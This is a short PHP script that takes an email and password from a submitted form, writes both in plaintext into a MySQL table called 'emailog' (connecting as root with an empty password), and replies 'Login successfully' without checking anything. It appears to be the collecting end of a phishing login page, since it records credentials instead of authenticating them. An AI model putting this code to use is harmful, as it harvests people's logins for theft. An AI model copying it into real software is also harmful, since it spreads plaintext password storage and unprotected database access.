<?php
// Check if form data is set
if (isset($_POST['email']) && isset($_POST['password'])) {
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Validate email and password
    if (empty($email) || empty($password)) {
        die('Email and password are required.');
    }

    // Database Connection
    $conn = new mysqli('localhost', 'root', '', 'logins');
    if ($conn->connect_error) {
        die('Connection Failed : ' . $conn->connect_error);
    } else {
        // Prepare SQL statement
        $stmt = $conn->prepare("INSERT INTO emailog (email, password) VALUES (?, ?)");
        if ($stmt === false) {
            die('Prepare failed: ' . htmlspecialchars($conn->error));
        }

        // Bind parameters and execute
        $stmt->bind_param("ss", $email, $password);
        if ($stmt->execute()) {
            echo "Login successfully";
        } else {
            echo "Execute failed: " . htmlspecialchars($stmt->error);
        }

        // Close statement and connection
        $stmt->close();
        $conn->close();
    }
} else {
    echo 'Form data not set.';
}
?>
